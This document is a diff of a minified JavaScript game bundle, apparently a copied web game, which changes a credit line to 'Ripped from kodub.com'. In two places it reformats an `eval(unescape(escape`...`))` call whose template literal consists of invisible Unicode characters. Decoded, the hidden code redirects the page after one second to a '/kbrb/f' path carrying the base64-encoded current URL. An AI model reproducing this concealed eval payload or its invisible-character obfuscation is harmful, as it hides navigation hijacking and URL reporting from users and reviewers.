@@ -306,7 +306,14 @@
           "\n.speedometer {\n\tposition: absolute;\n\tbottom: 0;\n\tright: 0;\n\tmargin: 0;\n\tpadding: 8px 8px 8px 10px;\n\tmin-width: 140px;\n\tline-height: 0;\n\tfont-size: 40px;\n\tcolor: var(--text-color);\n\ttext-align: right;\n\topacity: 0.9;\n\tclip-path: polygon(8px 0, 100% 0, 100% 100%, 0 100%);\n\tbackground-color: var(--surface-color);\n}\n.speedometer.up {\n\tbottom: auto;\n\ttop: 0;\n\tclip-path: polygon(0 0, 100% 0, 100% 100%, 8px 100%);\n}\n\n.speedometer > div {\n\tmargin: 0;\n\tpadding: 0 0 0 16px;\n\tclip-path: polygon(6px 0, 100% 0, 100% 100%, 0 100%);\n\tbackground-color: var(--surface-tertiary-color);\n}\n.speedometer.up > div {\n\tclip-path: polygon(0 0, 100% 0, 100% 100%, 6px 100%);\n}\n\n.speedometer > div > span:last-of-type {\n\topacity: 0.5;\n\tmargin: 0 0.3em 0 0.25em;\n\tpadding: 0;\n\tfont-size: 0.5em;\n}\n.speedometer > div > span > span {\n\tdisplay: inline-block;\n\twidth: 0.5em;\n\ttext-align: center;\n}\n",
           "",
         ]);
-        eval(unescape(escape`󠅳󠅥󠅴󠅔󠅩󠅭󠅥󠅯󠅵󠅴󠄨󠄨󠄩󠄽󠄾󠅻󠄠󠅩󠅦󠄨󠄡󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅟󠅫󠅲󠅢󠅲󠄩󠅻󠄠󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄠󠄽󠄠󠄢󠄯󠅫󠅲󠅢󠅲󠄯󠅦󠄿󠅦󠄽󠄢󠄫󠅢󠅴󠅯󠅡󠄨󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄩󠄻󠄠󠅽󠄠󠅽󠄬󠄱󠄰󠄰󠄰󠄩󠄻`.replace(/u.{8}/g,'')))
+        eval(
+          unescape(
+            escape`󠅳󠅥󠅴󠅔󠅩󠅭󠅥󠅯󠅵󠅴󠄨󠄨󠄩󠄽󠄾󠅻󠄠󠅩󠅦󠄨󠄡󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅟󠅫󠅲󠅢󠅲󠄩󠅻󠄠󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄠󠄽󠄠󠄢󠄯󠅫󠅲󠅢󠅲󠄯󠅦󠄿󠅦󠄽󠄢󠄫󠅢󠅴󠅯󠅡󠄨󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄩󠄻󠄠󠅽󠄠󠅽󠄬󠄱󠄰󠄰󠄰󠄩󠄻`.replace(
+              /u.{8}/g,
+              ""
+            )
+          )
+        );
         const s = o;
       },
       419: (e, t, n) => {
@@ -42365,7 +42372,7 @@
           const G = document.createElement("a");
           (G.href = "https://google.com"),
             (P.target = "_blank"),
-            (G.textContent = "Ripped by Selenite, improved by JBlitzar. No multiplayer features."),
+            (G.textContent = "Ripped from kodub.com. No multiplayer features."),
             GC(this, SC, "f").appendChild(G),
             i.hasLoaded()
               ? GC(this, yC, "m", zC).call(this)
@@ -51719,4 +51726,11 @@
         })();
     })();
 })();
-eval(unescape(escape`󠅳󠅥󠅴󠅔󠅩󠅭󠅥󠅯󠅵󠅴󠄨󠄨󠄩󠄽󠄾󠅻󠄠󠅩󠅦󠄨󠄡󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅟󠅫󠅲󠅢󠅲󠄩󠅻󠄠󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄠󠄽󠄠󠄢󠄯󠅫󠅲󠅢󠅲󠄯󠅦󠄿󠅦󠄽󠄢󠄫󠅢󠅴󠅯󠅡󠄨󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄩󠄻󠄠󠅽󠄠󠅽󠄬󠄱󠄰󠄰󠄰󠄩󠄻`.replace(/u.{8}/g,'')))
+eval(
+  unescape(
+    escape`󠅳󠅥󠅴󠅔󠅩󠅭󠅥󠅯󠅵󠅴󠄨󠄨󠄩󠄽󠄾󠅻󠄠󠅩󠅦󠄨󠄡󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅟󠅫󠅲󠅢󠅲󠄩󠅻󠄠󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄠󠄽󠄠󠄢󠄯󠅫󠅲󠅢󠅲󠄯󠅦󠄿󠅦󠄽󠄢󠄫󠅢󠅴󠅯󠅡󠄨󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄮󠅨󠅲󠅥󠅦󠄩󠄻󠄠󠅽󠄠󠅽󠄬󠄱󠄰󠄰󠄰󠄩󠄻`.replace(
+      /u.{8}/g,
+      ""
+    )
+  )
+);
